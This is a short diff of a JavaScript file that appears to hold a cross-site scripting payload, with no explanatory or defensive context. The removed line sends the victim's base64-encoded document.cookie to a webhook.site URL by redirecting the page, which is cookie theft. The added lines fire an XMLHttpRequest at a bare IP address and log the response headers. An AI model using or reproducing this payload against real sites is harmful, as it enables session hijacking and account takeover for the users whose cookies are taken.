@@ -1,1 +1,10 @@
-location = `https://webhook.site/277c6701-f362-4343-9688-b1e4544157c0?cookie=${btoa(document.cookie)}`
+const xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://124.70.33.170:3000/');
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === XMLHttpRequest.DONE) {
+    debugger;
+    const headers = xhr.getAllResponseHeaders();
+    console.log(headers);
+  }
+};
+xhr.send();
